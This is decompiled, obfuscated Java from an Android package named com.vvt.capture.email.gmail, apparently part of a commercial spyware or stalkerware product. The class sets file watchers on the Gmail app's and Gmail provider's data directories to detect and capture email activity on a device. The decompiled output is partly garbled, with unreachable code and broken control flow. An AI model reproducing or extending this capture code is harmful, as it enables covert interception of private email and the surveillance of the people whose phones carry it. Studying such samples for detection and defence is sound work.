package com.vvt.capture.email.gmail.b;

import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.capture.email.gmail.c;
import com.vvt.io.g;
import com.vvt.io.j;
import com.vvt.io.m;
import java.util.HashSet;
import java.util.Iterator;

public class a
  implements e, m
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private m d;
  private g e;
  private HashSet f;
  private i g;
  private j h;
  private boolean i;
  private String j;
  
  public a(m paramm)
  {
    this.d = paramm;
  }
  
  private void a(String paramString, HashSet paramHashSet, g paramg)
  {
    if (paramString == null) {}
    for (;;)
    {
      return;
      Object localObject1 = com.vvt.capture.email.gmail.b.a(paramString);
      a(paramHashSet);
      if (paramHashSet != null) {
        try
        {
          Object localObject3 = new com/vvt/capture/email/gmail/b/d;
          ((d)localObject3).<init>(this, paramString, paramg);
          ((d)localObject3).startWatching();
          paramHashSet.add(localObject3);
          localObject3 = ((HashSet)localObject1).iterator();
          for (;;)
          {
            boolean bool = ((Iterator)localObject3).hasNext();
            if (!bool) {
              break;
            }
            localObject1 = ((Iterator)localObject3).next();
            localObject1 = (String)localObject1;
            localObject1 = c.a(paramString, (String)localObject1);
            d locald = new com/vvt/capture/email/gmail/b/d;
            locald.<init>(this, (String)localObject1, paramg);
            locald.startWatching();
            paramHashSet.add(locald);
          }
        }
        finally {}
      }
    }
  }
  
  private void a(HashSet paramHashSet)
  {
    boolean bool1 = a;
    if ((!bool1) || (paramHashSet != null)) {
      try
      {
        Iterator localIterator = paramHashSet.iterator();
        for (;;)
        {
          bool1 = localIterator.hasNext();
          if (!bool1) {
            break;
          }
          Object localObject = localIterator.next();
          localObject = (d)localObject;
          boolean bool2 = a;
          if (bool2) {}
          ((d)localObject).stopWatching();
          localIterator.remove();
        }
        bool1 = a;
      }
      catch (Exception localException)
      {
        bool1 = c;
        if (!bool1) {}
      }
    }
    for (;;)
    {
      if (bool1) {}
      return;
      paramHashSet.clear();
    }
  }
  
  private void a(HashSet paramHashSet, g paramg)
  {
    a(paramHashSet);
    String[] arrayOfString = com.vvt.capture.email.gmail.b.b();
    if (paramHashSet != null) {}
    try
    {
      int k = arrayOfString.length;
      int m = 0;
      Object localObject1 = null;
      while (m < k)
      {
        String str = arrayOfString[m];
        d locald = new com/vvt/capture/email/gmail/b/d;
        locald.<init>(this, str, paramg);
        locald.startWatching();
        paramHashSet.add(locald);
        m += 1;
      }
      return;
    }
    finally {}
  }
  
  private void d()
  {
    Object localObject1 = com.vvt.capture.email.gmail.b.a();
    this.j = ((String)localObject1);
    localObject1 = this.j;
    boolean bool;
    Object localObject2;
    if (localObject1 == null)
    {
      bool = b;
      if (bool) {}
      localObject1 = this.f;
      localObject2 = this.e;
      a((HashSet)localObject1, (g)localObject2);
    }
    for (;;)
    {
      return;
      bool = b;
      if (bool) {}
      localObject1 = this.j;
      localObject2 = this.f;
      g localg = this.e;
      a((String)localObject1, (HashSet)localObject2, localg);
    }
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = true;
    this.i = bool;
    Object localObject = this.f;
    if (localObject == null)
    {
      localObject = new java/util/HashSet;
      ((HashSet)localObject).<init>();
      this.f = ((HashSet)localObject);
      this.g = parami;
      localObject = this.h;
      if (localObject == null)
      {
        localObject = j.a();
        this.h = ((j)localObject);
      }
      bool = a;
      if (bool) {}
      this.h.a("com.google.android.gm", this);
      localObject = this.h;
      String str = "com.google.android.providers.gmail";
      ((j)localObject).a(str, this);
    }
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    bool = a;
    if (bool) {}
    Object localObject = this.d;
    if (localObject != null)
    {
      localObject = this.d;
      ((m)localObject).a(paramString);
    }
    try
    {
      bool = b;
      if (bool) {}
      localObject = this.f;
      if (localObject != null)
      {
        localObject = this.f;
        a((HashSet)localObject);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    localObject = null;
    this.e = null;
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString1, String paramString2)
  {
    m localm = this.d;
    if (localm != null)
    {
      localm = this.d;
      localm.a(paramString1, paramString2);
    }
  }
  
  public void b()
  {
    bool = false;
    Object localObject = null;
    try
    {
      this.i = false;
      localObject = this.f;
      a((HashSet)localObject);
      localObject = this.h;
      if (localObject != null)
      {
        localObject = this.h;
        String str = "com.google.android.gm";
        ((j)localObject).a(str);
        localObject = this.h;
        str = "com.google.android.providers.gmail";
        ((j)localObject).a(str);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    this.f = null;
    this.e = null;
  }
  
  public void b(String paramString1, String paramString2)
  {
    Object localObject = this.d;
    if (localObject != null)
    {
      localObject = this.d;
      ((m)localObject).b(paramString1, paramString2);
    }
    localObject = this.e;
    if (localObject == null)
    {
      localObject = new com/vvt/capture/email/gmail/b/b;
      ((b)localObject).<init>(this);
      this.e = ((g)localObject);
      d();
    }
  }
  
  public void c(String paramString1, String paramString2)
  {
    m localm = this.d;
    if (localm != null)
    {
      localm = this.d;
      localm.c(paramString1, paramString2);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/gmail/removeFromPath/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */